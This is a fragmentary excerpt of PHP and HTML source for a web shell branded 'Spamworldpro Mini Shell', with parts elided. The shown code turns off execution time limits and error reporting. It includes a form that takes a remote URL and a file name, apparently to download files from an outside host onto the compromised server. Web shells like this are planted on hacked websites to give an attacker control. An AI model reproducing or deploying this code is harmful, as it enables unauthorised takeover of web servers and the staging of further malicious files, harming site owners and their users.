...
<center>
<font face="Bungee" size="5">Spamworldpro Mini Shell </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://media.discordapp.net/attachments/977951305018507334/1040194917546348595/logoz.png?width=576&height=576" width="280" height="280" title="Spamworldpro" alt="Spamworldpro" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
function author() {
	echo "<center><br>Spamworldpro Mini</center>";
	exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https://t.me/spamworldpro">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</center>
</form>';
echo "</table><br>";
